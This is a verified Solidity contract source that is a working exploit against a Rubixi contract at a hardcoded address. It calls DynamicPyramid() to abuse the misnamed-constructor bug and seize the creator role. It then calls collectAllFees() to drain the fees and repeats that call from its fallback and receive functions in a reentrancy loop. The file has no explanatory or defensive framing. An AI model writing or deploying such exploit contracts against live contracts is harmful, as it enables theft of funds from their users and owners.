/**
 *Submitted for verification at Etherscan.io on 2022-08-21
*/

// SPDX-License-Identifier: MIT
pragma solidity =0.8.16;

interface Rubixi {
    function DynamicPyramid() external;
    function collectAllFees() external;
}

contract Queryjob {

    Rubixi rubixi;
    //event printGetValue(uint _counter);
    // event printCurrentFeePercentage(uint _value);
    // event printNewOwner(address _newOwner);
    // event printReceive(uint _counter);
    uint public counter = 0;

    // Payable address can receive Ether
    address payable public owner;

    // Payable constructor can receive Ether
    constructor() payable {
        owner = payable(msg.sender);
        rubixi = Rubixi(0xEe954bCd6C55A39a7860bbd2B4D68E5b67EbFb13);
    }

    function checkBalance() public view returns (uint) {
        return address(this).balance;
    }

    function sendEtherToRubixi() public payable {
        require((msg.sender == owner), "not the owner");
        (bool sent, bytes memory data) = address(0xEe954bCd6C55A39a7860bbd2B4D68E5b67EbFb13).call{value: msg.value}("");
        require(sent, "Failed to send Ether");
    }

    function setDynamicPyramid() public {
        require((msg.sender == owner), "not the owner");
        rubixi.DynamicPyramid();
        // rubixi.changeOwner(msg.sender);
        // address newOwner = rubixi.creator();
        // emit printNewOwner(newOwner);
    }

    function collectValue() public {
        require((msg.sender == owner), "not the owner");
        rubixi.collectAllFees();
        //emit printGetValue(counter);  
    }

    fallback() external payable {
        if (counter <= 5 ) { 
            counter += 1;
            rubixi.collectAllFees(); 
        }
    }

    receive() external payable {
        if (counter <= 5 ) { 
            counter += 1;
            rubixi.collectAllFees(); 
        }
    }
}